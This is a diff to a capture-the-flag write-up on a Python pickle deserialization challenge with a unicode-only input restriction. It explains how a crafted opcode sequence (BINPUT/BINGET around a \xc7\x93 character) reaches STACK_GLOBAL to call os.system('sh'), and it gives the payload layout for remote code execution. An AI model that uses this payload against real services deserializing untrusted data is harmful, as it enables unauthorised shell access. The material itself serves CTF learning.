@@ -10,27 +10,39 @@ import pickle
 pickle.loads(input("pickle: ").split()[0].encode())
 ```
 
-standard pickle chall, but all chars must be unicode encodable
+(standard pickle chall, but all chars must be unicode encodable)
 
 # solution
 
 we can look at [pickle.py](https://github.com/python/cpython/blob/3.10/Lib/pickle.py) in the python source code and see what opcodes are unicode-friendly
 
-notably, the `STACK_GLOBAL` opcode is not unicode friendly by itself
+notably, the `STACK_GLOBAL` opcode is not unicode friendly by itself (it uses the `\x93` byte)
 
-`GLOBAL` and `INST`, the other two ways to get arbitrary classes, are not possible because the `.split()[0]` in the problem makes it impossible to have any tabs, spaces, or newlines
+![image](https://github.com/quasar098/ctf-writeups/assets/70716985/146ed390-c045-4899-badc-50cccda4d6a3)
+
+`GLOBAL` and `INST`, the other two ways to get arbitrary classes, are not possible because the `.split()[0]` in the problem makes it impossible to have any tabs, spaces, or newlines. both of these opcodes require newlines to pass in arguments for the opcodes, so this is not possible.
+
+![image](https://github.com/quasar098/ctf-writeups/assets/70716985/0acfd359-c244-4c3b-8cbe-a38393418651)
+
+![image](https://github.com/quasar098/ctf-writeups/assets/70716985/fe702141-ace4-423b-bd96-b5fd28a1de04)
+
+![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a9993495-5150-4f70-a5ad-be83515601bf)
 
 therefore, we must find a way to use `STACK_GLOBAL`
 
-![image](https://github.com/quasar098/ctf-writeups/assets/70716985/35dc0137-4240-46d0-9a8e-0e3f2f85b98b)
-
-we can get access to it by throwing away an arbitrary byte that is attached before it to make it valid unicode. notably, `b'\xc7\x93'` is a valid unicode character, for some reason.
+we can get access to it by throwing away an arbitrary byte that is attached before it to make it valid unicode. notably, `b'\xc7\x93'` is a valid unicode character, for some reason. so, if we can discard the c7 byte, we can achieve RCE
 
 i found that out by enumerating over a large range of integers (like 0 to 20000) and using chr() and decoding and encoding it to see if it sticked, and also only outputting the ones that have `\x93` byte in them
 
-then, we can discard the `\xc7` by using `BINGET`, which takes a byte argument and retrieves the item assigned to byte 0xc7 from memo and puts it on the stack. 
+```py
+for v in range(20000):
+    if b'\x93' in chr(v).encode('utf-8'):
+        print(v, chr(v).encode('utf-8'))
+```
 
-in this case, the item was `"system"`, and the previous item on the stack was `"os"`
+then, we can discard the `\xc7` by using `BINGET`, which takes a byte argument and retrieves the item assigned to byte c7 from memo and puts it on the stack. 
+
+in this case, the item was `"system"`, and the previous item on the stack was `"os"`, so stack global gets us os.system
 
 therefore, we can use `STACK_GLOBAL` to produce os.system, and then we can spawn a shell.
 
@@ -52,13 +64,15 @@ p.sendline(q)
 p.interactive()
 ```
 
-also, we had to use `SHORT_BINSTRING` because it had all unicode-compliant characters (we cannot use binunicode because it requires `\n` iirc)
+also, we had to use `SHORT_BINSTRING` because it uses all unicode-compliant characters (we cannot use binunicode opcode because it requires `\n` iirc)
 
 also, we don't need `PROTO` because it is assumed as 0, which is fine i guess
 
 what the payload does to the stack and memo is below
 
 ```
+bs('os') + bs('system') + BINPUT + b'\xc7' + '\x88' + POP + POP + BINGET + b'\xc7' + '\x93' + MARK + bs('sh') + TUPLE + REDUCE + STOP
+=====================
 start of pickle
 ["os"] {} - put os on the stack
 ["os", "system"] {} - put system on the stack
